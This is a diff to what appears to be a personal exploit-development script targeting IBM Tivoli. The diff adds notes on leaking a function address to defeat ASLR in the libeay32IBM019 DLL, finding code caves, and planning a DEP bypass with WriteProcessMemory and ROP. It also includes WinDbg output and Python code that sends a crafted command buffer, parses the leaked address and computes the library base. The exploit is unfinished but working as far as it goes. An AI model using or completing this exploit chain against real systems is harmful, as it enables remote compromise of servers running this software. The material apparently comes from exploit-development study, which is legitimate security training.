@@ -1,4 +1,4 @@
-"""
+r"""
 =============================================================================
 =========================== - Breakpoints (Old) - ===========================
 =============================================================================
@@ -70,23 +70,95 @@ results in the psCommandBuffer
 getIPAddr&Port -> gets existing TCP conn to send info back to
                   switched existing connection type to recieve buffer
 
-01b30000 01b5b000   
+01b30000 01b5b000
 gsk8iccs C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
 
-01b60000 01b9a000   
+01b60000 01b9a000
 icclib019 C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
 
-02f80000 03070000   
+02f80000 03070000
 libeay32IBM019 C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
 
-Using IBM DLLs, we can ensure that our exploit is at least only tivoli 
+Using IBM DLLs, we can ensure that our exploit is at least only tivoli
 version dependent, and not dependent on windows versions
 
-Rule of Thumb (RoT) for choosing modules is to ensure the upper bytes are 
+Rule of Thumb (RoT) for choosing modules is to ensure the upper bytes are
 not 00, all 3 are fine here, ill use libeay32IBM019 as its the highest out
 of the 3 modules
-=============================================================================
 
+analyzing the library, an exported func `N98E_CRYPTO_get_new_lockid` has
+an offset of +14E0 with an ordinal of 1026
+
+by subtracting this offset from the leaked address of the func, we get the
+base addr of the lib. this is aslr bypass
+
+now to bypass DEP as ASLR is used in tandem to enhance DEP, we need to do
+what was done before via VirtualAlloc and ROP gadgets, but this time we'll
+use WriteProcessMemory to copy our code from the stack to the code
+(text section)page of our target library
+
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+
+now to find code caves, i.e. padding bytes
+0x3c from MZ header -> PE Header
+0x2c from PE header -> offset to code section
+
+0:078> ? libeay32IBM019 + 1000
+03141000
+
+now to analyze the code section
+!address 03141000
+
+Usage:                  Image
+Base Address:           03141000
+End Address:            031d3000
+Region Size:            00092000 ( 584.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000020          PAGE_EXECUTE_READ
+Type:                   01000000          MEM_IMAGE
+Allocation Base:        03140000
+Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
+
+
+This can also be done with !dh, we just need to take the upper bound of the
+code section and subtract it with a very large enough value to store our
+shellcode
+
+the book only subtracted 0x400, but ive seen that 0x900 is also good enough
+00000c00
+
+
+note: this is very confusing to follow while working with brain fog
+
+lib: libeay32ibm019
+offset1: 0x3c                                 <- gets us to PE header
+offset2: 0x2c + offset1                       <- offset of code section 
+CS->libeay32ibm019: baseAddress + offset1     <- Code Section
+then
+
+libeay32ibm019 baseAddress + offset2 gets us to the code section
+
+then 
+
+we use the END_ADDRESS of the code section
+    - take away 0x400 bytes to make space for our code
+
+now 
+
+to get the offset for this, we
+    - END_ADDRESS - baseAddress - 0x400 (This gives offset from baseAddress to the code cave)
+
+ENSURE: offset does not have any null bytes
+
+
+just realized, this is needless. can use pykd to automate locating code caves
+=============================================================================
 
 """
 
@@ -117,7 +189,7 @@ buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34
 
 # psCommandBuffer
 
-symbol = b"SymbolOperationWriteProcessMemory" + b"\x00"
+symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00"
 buf += symbol + b"A" * (0x100 - len(symbol))
 buf += b"B" * 0x100
 buf += b"C" * 0x100
@@ -222,9 +294,20 @@ def main():
                 print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
                 return 1
 
+            # Should have a valid response, parse it and get the address
+            functionAddress = parseResponse(response)
+            print(Fore.GREEN + f"o Found leaked address: 0x{functionAddress:08x}" + Style.RESET_ALL)
 
-            address = parseResponse(response)
-            print(Fore.GREEN + f"o Found leaked address: 0x{address:08x}" + Style.RESET_ALL)
+            # Target Function Offset observed from loading the dll in IDA was noted
+            functionOffset = 0x14E0
+
+            # Can use the in memory address and preferred function offset to get the base address
+            # of the library
+            libraryBase = functionAddress - functionOffset
+            print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}" + Style.RESET_ALL)
+
+            # 
+
             return 0
 
     except socket.timeout:
